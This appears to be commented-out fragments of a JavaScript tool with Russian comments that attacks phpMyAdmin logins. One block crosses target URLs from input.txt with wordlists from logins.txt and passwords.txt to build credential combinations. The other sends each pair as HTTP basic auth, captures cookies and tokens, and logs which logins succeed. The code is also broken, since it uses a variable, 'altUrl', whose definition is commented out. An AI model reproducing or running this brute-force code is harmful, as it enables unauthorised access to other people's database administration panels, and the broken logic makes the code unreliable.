
/* ДО ВНЕДРЕНИЯ МНОГОПОТОЧНОСТИ
// Обрабатываем строки из input.txt
for (const line of rawLines) {
    const parsed = parseLine(line);
    if (parsed) {
        targets.add(parsed);

        /!*!// Добавляем зеркальный URL (http <-> https)
        const altUrl = parsed.url.startsWith("http://")
            ? parsed.url.replace("http://", "https://")
            : parsed.url.replace("https://", "http://");
        targets.add({ url: altUrl, login: parsed.login, password: parsed.password });*!/
    }
}

// === Генерация всех комбинаций ===
const loginList = [...logins];
const passwordList = [...passwords];

let combinations = new Set();

for (const { url, login, password } of targets) {
    // Оригинальная комбинация
    combinations.add({ url, login, password });

    // Генерация комбинаций с logins.txt и passwords.txt
    passwordList.forEach(extraPassword => {
        combinations.add({ url, login, password: extraPassword }); // Меняем только пароль
    });

    loginList.forEach(extraLogin => {
        combinations.add({ url, login: extraLogin, password }); // Меняем только логин
    });

    /!*!// Зеркальный URL (http <-> https)
    const altUrl = url.startsWith("http://")
        ? url.replace("http://", "https://")
        : url.replace("https://", "http://");
    combinations.add({ url: altUrl, login, password });*!/

    passwordList.forEach(extraPassword => {
        combinations.add({ url: altUrl, login, password: extraPassword }); // Меняем только пароль
    });

    loginList.forEach(extraLogin => {
        combinations.add({ url: altUrl, login: extraLogin, password }); // Меняем только логин
    });
}
// Используем Map для удаления дубликатов
const uniqueMap = new Map();
for (const obj of combinations) {
    const key = JSON.stringify(obj);
    if (!uniqueMap.has(key)) {
        uniqueMap.set(key, obj);
    }
}

// Преобразуем обратно в Set
const uniqueCombinations = new Set(uniqueMap.values());

logger.info(`✅ Сформировано ${uniqueCombinations.size} комбинаций для тестирования.`);
*/


// === Функция для авторизации при ['auth_type'] = 'http' === in PMA Client
/*loginAndGetCookiesHttp = async () => {
    try {
        // Запрос к странице входа для получения куки
        const response = await axios.get(this.phpMyAdminUrl, {
            headers: { "User-Agent": "Mozilla/5.0" },
            validateStatus: (status) => true, // обрабатываем дальше при 401 без выброса ошибки
        });

        // Получаем куки из ответа
        const rawCookies = response.headers["set-cookie"];
        if (rawCookies) {
            this.updateCookies(rawCookies)
        }

        // Отправляем GET-запрос на авторизацию
        this.encodedAuth = 'Basic ' + Buffer.from(`${this.login}:${this.password}`).toString('base64');
        const loginResponse = await axios.get(this.phpMyAdminUrl, {
            headers: {
                "User-Agent": "Mozilla/5.0",
                Cookie: this.cookie,
                Authorization: this.encodedAuth
            }
        });

        // Извлекаем токен из HTML ответа
        this.updateToken(loginResponse.data);

        logger.info(`✅ Авторизация успешна (${this.login}:${this.password}).`);
        return true;
    } catch (error) {
        logger.error(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message} -> ${error.stack}`);
        return false;
        //throw error;
    }
};*/